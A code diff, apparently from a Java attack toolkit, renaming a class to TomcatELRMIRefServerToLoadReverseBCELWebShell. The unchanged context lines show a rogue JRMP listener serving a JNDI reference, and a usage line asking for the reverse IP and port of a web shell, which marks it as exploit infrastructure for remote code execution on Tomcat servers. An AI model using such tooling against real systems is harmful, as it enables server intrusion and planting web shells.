@@ -67,7 +67,7 @@ import sun.rmi.transport.TransportConstants;
 @SuppressWarnings ( {
     "restriction"
 } )
-public class TomcatELRMIRefServerToLoadReverseWebShell implements Runnable {
+public class TomcatELRMIRefServerToLoadReverseBCELWebShell implements Runnable {
 
     private int port;
     private ServerSocket ss;
@@ -77,7 +77,7 @@ public class TomcatELRMIRefServerToLoadReverseWebShell implements Runnable {
     private ReferenceWrapper referenceWrapper;
 
 
-    public TomcatELRMIRefServerToLoadReverseWebShell( int port, ReferenceWrapper referenceWrapper ) throws IOException {
+    public TomcatELRMIRefServerToLoadReverseBCELWebShell( int port, ReferenceWrapper referenceWrapper ) throws IOException {
         this.port = port;
         this.referenceWrapper = referenceWrapper;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
@@ -118,7 +118,7 @@ public class TomcatELRMIRefServerToLoadReverseWebShell implements Runnable {
 
     public static final void main ( final String[] args ) {
         if ( args.length < 2 ) {
-            System.err.println(TomcatELRMIRefServerToLoadReverseWebShell.class.getSimpleName() + " <port> <webshell-reverse-ip> <webshell-reverse-port>"); //$NON-NLS-1$
+            System.err.println(TomcatELRMIRefServerToLoadReverseBCELWebShell.class.getSimpleName() + " <port> <webshell-reverse-ip> <webshell-reverse-port>"); //$NON-NLS-1$
             System.exit(-1);
         }
         int port = Integer.parseInt(args[0]);
@@ -138,7 +138,7 @@ public class TomcatELRMIRefServerToLoadReverseWebShell implements Runnable {
             ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
 
             System.err.println("* Opening JRMP listener on " + port);
-            TomcatELRMIRefServerToLoadReverseWebShell c = new TomcatELRMIRefServerToLoadReverseWebShell(port, referenceWrapper);
+            TomcatELRMIRefServerToLoadReverseBCELWebShell c = new TomcatELRMIRefServerToLoadReverseBCELWebShell(port, referenceWrapper);
             c.run();
         } catch (RemoteException e) {
             e.printStackTrace();
